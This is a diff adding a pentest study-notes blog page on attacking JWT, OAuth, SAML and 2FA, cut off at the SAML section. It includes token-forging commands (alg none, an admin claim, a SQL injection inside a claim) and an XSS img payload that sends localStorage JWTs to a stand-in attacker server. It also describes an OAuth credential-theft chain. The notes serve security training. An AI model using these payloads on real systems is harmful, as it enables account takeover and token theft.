@@ -1,0 +1,1184 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>13 - Authentication &amp; SSO |</title>
+<meta name="description" content="Attacking JWT, OAuth, SAML and Bypassing 2FA ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="13 - Authentication &amp; SSO">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/authenticationsso/">
+
+
+  <meta property="og:description" content="Attacking JWT, OAuth, SAML and Bypassing 2FA ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header5.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-05T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/authenticationsso/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header5.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          13 - Authentication &amp; SSO
+
+        
+      </h1>
+      
+        <p class="page__lead">Attacking JWT, OAuth, SAML and Bypassing 2FA
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  15 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/" class="active">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="13 - Authentication &amp; SSO">
+    <meta itemprop="description" content="Attacking JWT, OAuth, SAML and Bypassing 2FA">
+    <meta itemprop="datePublished" content="2023-12-05T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#attacking-authentication--sso">Attacking Authentication &amp; SSO</a>
+    <ul>
+      <li><a href="#authentication-in-web-apps">Authentication in Web Apps</a></li>
+      <li><a href="#json-web-tokens-jwt">JSON Web Tokens (JWT)</a></li>
+      <li><a href="#oauth">OAuth</a></li>
+      <li><a href="#common-oauth-attacks">Common OAuth Attacks</a></li>
+      <li><a href="#insecure-storage-of-handle-based-access-and-refresh-tokens">Insecure Storage of Handle-Based Access and Refresh Tokens</a></li>
+      <li><a href="#security-assertion-markup-language-saml">Security Assertion Markup Language (SAML)</a></li>
+      <li><a href="#common-2fa-bypasses">Common 2FA Bypasses</a></li>
+      <li><a href="#lab">Lab</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="attacking-authentication--sso">Attacking Authentication &amp; SSO</h1>
+
+<ul>
+  <li>Authentication in Web Apps</li>
+  <li>Attacking JWT</li>
+  <li>Attacking Oauth</li>
+  <li>Attacking SAML</li>
+  <li>Bypassing 2FA</li>
+</ul>
+
+<p>Objectives:</p>
+
+<ul>
+  <li>How to attack modern authentication and SSO implementations</li>
+  <li>The weak spots of JWT, SAML, OAth and 2FA</li>
+</ul>
+
+<h2 id="authentication-in-web-apps">Authentication in Web Apps</h2>
+<p>Its the process of utilizing a credential, known as an identity, to validate that the identify has permission to access the resource. In this case, the resource is the web application.</p>
+
+<p>We will focus on discussing authentication performed through a username/password combination, secret token (cookie), or a ping code</p>
+
+<h3 id="some-features-that-web-app-uses">Some Features that web app uses</h3>
+<ul>
+  <li>JSON Web Token (JWT) - A compact mechanism used For transfering claims between two parties</li>
+  <li>OAuth - Enables a third-party application to obtain limited access to an HTTP service, either on behalf of a resource owner by orchestrating an approval interaction between the resource owner and the hTTP service, or by allowing the third-party application to obtain access on its own behalf</li>
+  <li>Security Assertion Markup Language (SAML) - An XML based single sign-on login standard</li>
+</ul>
+
+<p>Moreover:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://tools.ietf.org/html/rfc7519
+- https://tools.ietf.org/html/rfc6749
+- https://tools.ietf.org/html/rfc7522
+</code></pre></div></div>
+
+<h3 id="2fa">2FA</h3>
+<p>Modern Web Apps also utilize an extra layer of defense when it comes to authentication, 2 factor authentication (2FA)</p>
+
+<p>Its a method to verify a users identity by utilizing a combination of two different factors:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Something you know (password)
+- Something you have (OTP)
+- Something you are  (biometric)
+</code></pre></div></div>
+
+<h3 id="2fa-bypasses">2FA Bypasses</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Brute Force (when a secret of limited length is utilized)
+- Less common interfaces (mobile app, XMLRPC, API instead of web)
+- Forced Browsing
+- Predictable/Reusable Tokens
+</code></pre></div></div>
+
+<h2 id="json-web-tokens-jwt">JSON Web Tokens (JWT)</h2>
+<p>According to the official JSON website (https://jwt.io/introduction/), a JWT consists of the following 3 piece in its structure:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Header
+- Payload
+- Signature
+</code></pre></div></div>
+
+<p>In a <strong>header</strong>, you will find the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Type of the token
+- Signing algorithm
+</code></pre></div></div>
+
+<blockquote>
+  <p>While in a <strong>payload</strong> u will find the claims</p>
+</blockquote>
+
+<h3 id="the-signature-consists-of-signing">The ‘signature’ consists of signing:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Encoded header
+- Encoded payload
+- A secret
+- Algorithm specified in the header
+</code></pre></div></div>
+
+<h3 id="to-sign-an-unsigned-token-the-process-is-as-follows">To sign an unsigned token, the process is as follows:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- unsignedToken = encodedBase64(header) + '.' + encodedBase64(payload)
+- signature_encoded = encodedBase64(HMAC-SHA256("secret", unsignedToken))
+- jwt_token = encodedBase64(header) + "." + encodedBase64(payload) + "." + signature_encoded
+</code></pre></div></div>
+
+<h3 id="jwt-security-facts">JWT Security Facts</h3>
+<p>JWT is not vuln to CSRF (except when JWT is put in a cookie)</p>
+
+<ul>
+  <li>Session theft through an XSS attack is possible when JWT is used</li>
+  <li>Improper token storage (HTML5 storage/cookie)</li>
+  <li>Sometimes the key is weak and can be brute-forced</li>
+  <li>Faulty token expiration</li>
+  <li>JWT can be used as Bearer token in a custom authorization header</li>
+</ul>
+
+<p>JWT is being used For stateless applications. JWT usage results in no server-side storage and database-based session management. All info is put inside a signed JWT token:</p>
+
+<ul>
+  <li>only relying on the secret key</li>
+  <li>logging out or invalidating specific users is not possible due to the above stateless approach. The same signing key is used For everyone.</li>
+</ul>
+
+<p>JWT-based authentication can become insecure when client-side data inside the JWT are blindly trusted</p>
+
+<p>Many apps blindly accept the data contained in the payload (no signature verification)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- try submitting various injection-related strings
+- try changing a users role to admin
+</code></pre></div></div>
+
+<p>Many apps have no problem accepting an empty signature (effectively no signature)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- the above is also known as "the admin party in JWT"
+- this is by design, to support cases when tokens have already been verified through another way
+- when assessing JWT endpoints set the alg to none and specify anything in the payload
+</code></pre></div></div>
+
+<p>Moreover JWT Security information:</p>
+
+<p>→ https://www.reddit.com/r/netsec/comments/dn10q2/practical_approaches_for_testing_and_breaking_jwt/</p>
+
+<h3 id="tools-for-assessingattacking-jwt">Tools for assessing/attacking JWT</h3>
+<p>→ https://github.com/KINGSABRI/jwtear</p>
+
+<p>HMAC SHA256 signed token creation example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jwtear</span> <span class="o">--</span><span class="nx">generate</span><span class="o">-</span><span class="nx">token</span> <span class="o">--</span><span class="nx">header</span> <span class="dl">'</span><span class="s1">{"typ":"JWT","alg":"HS256"}</span><span class="dl">'</span> <span class="o">--</span><span class="nx">payload</span> <span class="dl">'</span><span class="s1">{"login":"admin"}</span><span class="dl">'</span> <span class="o">--</span><span class="nx">key</span> <span class="dl">'</span><span class="s1">cr@zyp@ss</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>Empty signature token creating example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jwtear</span> <span class="o">--</span><span class="nx">generate</span><span class="o">-</span><span class="nx">token</span> <span class="o">--</span><span class="nx">header</span> <span class="dl">'</span><span class="s1">{"typ":"JWT","alg":"none"}</span><span class="dl">'</span> <span class="o">--</span><span class="nx">payload</span> <span class="dl">'</span><span class="s1">{"login":"admin"}</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>Testing For injection example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jwtear --generate-token --header '{"typ":"JWT","alg":"none"}' --payload $'{"login":"admin\' or \'a\'=\'a"}'                  "
+// $ is used to escapse single quotes
+</code></pre></div></div>
+
+<h3 id="jwt-attack-scenario-1">JWT Attack Scenario 1</h3>
+<p>brute-forcing/guessing the secret used to sign a token:</p>
+
+<p><img src="/assets/images/posts/ewptx/71.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="jwt-attack-scenario-2">JWT Attack Scenario 2</h3>
+<p>When attacking authentication through an XSS vuln, we usually try to capture a victims cookie as follows:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>When JWT is employed an localStorage is used, we can attack authentication through XSS using JSON.stringify:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'https://attacker-server/yikes?jwt='</span><span class="err">+</span><span class="na">JSON.stringify</span><span class="err">(</span><span class="na">localStorage</span><span class="err">);'</span><span class="na">--</span><span class="err">!</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>If u obtain an IdToken, u can use it to authenticate and impersonate the victim
+If u obtain an accessToken, u can use it to generate a newIdToken with the help of the authentication endpoint</p>
+</blockquote>
+
+<h3 id="jwt-attack-scenario-3">JWT Attack Scenario 3</h3>
+<p>A bitcoin CTF challenge that included JWT:</p>
+
+<ul>
+  <li>uppon successful login, the user is issued a JWT inside a cookie</li>
+  <li>HS256 is used</li>
+  <li>A user named admin exists</li>
+  <li>One of the field in the JWT header, kid, is used by the server to retrieve the key and verify the signature. The problem is that no proper escaping takes place while doing so.</li>
+</ul>
+
+<blockquote>
+  <p>If an attacker manages to control or inject to <strong>kid</strong>’, he will be able to create his own signed tokens (since kid is essentially the key that is used to verify the signature)</p>
+</blockquote>
+
+<p>What we can do:
+Inject <strong>kid</strong> and specify a value that resides on the web server and can be predicted (as well as retrieved by the server of course)</p>
+
+<ul>
+  <li>through provoking errors we identified that the application is using <strong>sinatra</strong> under the hood</li>
+  <li>such a value could be ‘public/css/bootstrap.css’ &lt;- this value comes from sinatras documentation/best practices and its a legitimate value since no proper escaping occurs while retrieving <strong>kid</strong></li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/72.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/73.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="oauth">OAuth</h2>
+<p>Its the main web standard For authorization between services. Its used to authorize 3rd party apps to access services or data from a provider with which you have an account.</p>
+
+<h3 id="oauth-components">OAuth Components:</h3>
+<ul>
+  <li><strong>Resource Owner</strong>: the entity that can grant access to a protected resource. Typically this is the end-user</li>
+  <li><strong>Client</strong>: an application requesting access to a protected resource on behalf of the resource owner. This is also called a Relying Party</li>
+  <li><strong>Resource Server</strong>: the server hosting the protected resources. This is the API you want to access, in our case gallery</li>
+  <li><strong>Authorization server</strong>: the server that authenticates the Resource Owner, and issues access tokens after getting proper authorization. This is also called an identity provider (IdP)</li>
+  <li><strong>User Agent</strong>: the agent used by the Resource Owner to interact with the Client, For example a browser or a mobile application.</li>
+</ul>
+
+<h3 id="oauth-scopes-actions-or-privilege-requested-from-the-service---visible-through-the-scope-parameter">OAuth Scopes (actions or privilege requested from the service - visible through the scope parameter):</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Read
+- Write
+- Access Contacts
+</code></pre></div></div>
+
+<h3 id="oauth-20">OAuth 2.0</h3>
+<ol>
+  <li>The <strong>authorization code grant</strong>: the client redirects the user (Resource Owner) to an Authorization server to ask the user whether the Client can access her Resources. After the user confirms, the Client obtains an Authorization Code that the Client can exchange For an Access Token. This Access Token enables the Client to access the Resources of the Resources Owner.</li>
+  <li>The <strong>implicit grant</strong> is a simplification of the authorization code grant. The client obtains the Access Token directly rather than being issued an Authorization Code.</li>
+  <li>The <strong>resource owner password credentials grant</strong> enables the Client to obtain an Access Token by using the username and password of the Resource Owner.</li>
+  <li>The <strong>client credentials grant</strong> enables the Client to obtain an Access Token by using its own credentials.</li>
+</ol>
+
+<blockquote>
+  <p>Clients can obtain <strong>Access Tokens</strong> via 4 different flows
+Clients use these <strong>Access Tokens</strong> to access an API</p>
+</blockquote>
+
+<blockquote>
+  <p>The <strong>Access Tokens</strong> is almost always a bearer token
+Some applications use JWT as access tokens</p>
+</blockquote>
+
+<h2 id="common-oauth-attacks">Common OAuth Attacks</h2>
+
+<p><img src="/assets/images/posts/ewptx/81.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="unvalidated-redirecturi-parameter">Unvalidated RedirectURI Parameter</h3>
+<p>If the authorization server does not validate that the redirect URI belongs to the client, its susceptible to two types of attacks:</p>
+
+<ul>
+  <li>Open Redirect</li>
+  <li>Account hijacking by stealing authorization codes.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/80.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>If an attacker redirects to a site under their control, the authorization code - which is part of the URI - is given to them. 
+They may be able to exchange if For an access token and thus get access to the users resources.</p>
+</blockquote>
+
+<h3 id="weak-authorization-codes">Weak Authorization Codes</h3>
+<p>If the authorization codes are weak, an attacker may be able to guess them at the token endpoint. This is especially true if the client secret is compromised, not used, or not validated.</p>
+
+<p><img src="/assets/images/posts/ewptx/74.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="everlasting-authorization-codes">Everlasting Authorization Codes</h3>
+<p>Expiring unused authorization codes limits the window in which an attacker can use captured or guessed authorization codes, but thats not always the case.</p>
+
+<p><img src="/assets/images/posts/ewptx/75.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="authorization-codes-not-bound-to-client">Authorization Codes Not Bound to Client</h3>
+<p>An attacker can exchange captured or guessed authorization codes For access tokens by using the credentials For another, potentially malicious, client.</p>
+
+<p><img src="/assets/images/posts/ewptx/76.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="weak-handle-based-access-and-refresh-tokens">Weak Handle-Based Access and Refresh Tokens</h3>
+<p>If the tokens are weak, an attacker may be able to guess them at the resource server or the token endpoint.</p>
+
+<p><img src="/assets/images/posts/ewptx/77.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="insecure-storage-of-handle-based-access-and-refresh-tokens">Insecure Storage of Handle-Based Access and Refresh Tokens</h2>
+<p>If the handle-based tokens are stored as plain text, an attacker may be able to obtain them from the database at the resource server or the token endpoint.</p>
+
+<p><img src="/assets/images/posts/ewptx/78.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="refresh-token-not-bound-to-client">Refresh Token not Bound to Client</h3>
+<p>If the binding between a refresh token and the client is not validated, a malicious client may be able to exchange captured or guessed refresh tokens For access tokens. This is especially problematic if the application allows automatic registration of clients.</p>
+
+<p><img src="/assets/images/posts/ewptx/79.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="oauth-attack-scenario-2">OAuth Attack Scenario 2</h3>
+<p>In this scenario, we r gonna see an OAuth-Based XSS vuln was chained with an insecure X-Frame-Options header and an enabled Autocomplete functionality to provide the attacker with User/Admin credentials.</p>
+
+<blockquote>
+  <p>This attack was discovered when pentesting the first iterations of the Open Bank Project (OBP)</p>
+</blockquote>
+
+<p>Step 0:
+We identified that the redirectUrl parameter is vulnerable to reflected cross-site scripting (XSS) attacks due to inadequate sanitization of user supplied data.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Vulnerable parameter: 'redirectUrl'
+Page resource: 'http://openbankdev:8080/oauth/thanks'
+Attack vector: http://openbankdev:8080/oauth/thanks?redirectUrl=[JS attack vector]
+</code></pre></div></div>
+
+<p><strong>Step 1</strong>:</p>
+
+<p>The following image displays that we were able to load a malicious JavaScript into the vulnerable OBP web page from an external location. The payload depicted is jQuery specific.</p>
+
+<p><img src="/assets/images/posts/ewptx/82.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>Step 2</strong>:</p>
+
+<p>Utilizing the inject JavaScript we created an invisible iframe that contained OBPs login page. That was possible due to the fact that the X-Frame-Options header of OBPs login page was set to the SAMEORIGIN value.</p>
+
+<p><img src="/assets/images/posts/ewptx/83.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>Step 3</strong>:</p>
+
+<p>We finally injected the following JavaScript code to access the iframes forms that contained user credentials due to the fact that Autocomplete functionality was not explictly disabled</p>
+
+<p><img src="/assets/images/posts/ewptx/84.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>Step 4</strong>:</p>
+
+<p>A previously set up netcat listener received the targer users password</p>
+
+<p><img src="/assets/images/posts/ewptx/85.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>Bonus Step</strong>:</p>
+
+<p>We also chained the above mentioned OAuth-based XSS vuln with the insufficiently secure X-Frame-Options header of the <strong>GET API Key</strong> page (which was set to SAMEORIGIN) and a CSRF vulnerability on the API creation functionality</p>
+
+<p><img src="/assets/images/posts/ewptx/86.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>Bonus Step</strong>:</p>
+
+<p>We finally inject a JavaScript function, similar to the one used For the remote credential theft attack, to access the iframes contents including the created applications API key. This time, a remote API key theft attack occured.</p>
+
+<p><img src="/assets/images/posts/ewptx/87.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="oauth-attack-scenario-3">OAuth Attack Scenario 3</h3>
+<p>Attacking the <strong>Connect</strong> request</p>
+
+<ul>
+  <li>This attack exploits the first request (when a user clicks the <strong>Connect</strong> or <strong>Sign in with</strong> button).</li>
+  <li>User are many times allowed by websites to connect additional accounts like Google, using OAuth. An attacker can gain access to the victims account on the Client by connecting one of his/her own account (on the Provider)</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/88.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="oauth-attack-scenario-4">OAuth Attack Scenario 4</h3>
+<p>CSRF on the Authorization Response</p>
+
+<ul>
+  <li>OAuth 2.0 provides security against CSRF-like attacks through the state parameter. This parameter is passed in the 2nd and 3rd request of the OAuth <strong>dance</strong>. It acts like a CSRF token.</li>
+</ul>
+
+<p>In newer implementations of OAuth, this paramater is not required and is optional.</p>
+
+<blockquote>
+  <p>If you come across in an implementation where this parameter is not utilized, you can try the attack flow on your right.</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/ewptx/89.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="security-assertion-markup-language-saml">Security Assertion Markup Language (SAML)</h2>
+<p>Official documentation:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0-cd-02.html#2.Overview|outline
+</code></pre></div></div>
+
+<ul>
+  <li>OASIS SAML defines an XML-based framework For describing and exchanging security information between on-line business partners.</li>
+  <li>it defines precise syntax and rules For requesting, creating, communicating, and using these SAML assertions.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/90.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="saml-security-considerations">SAML Security Considerations</h3>
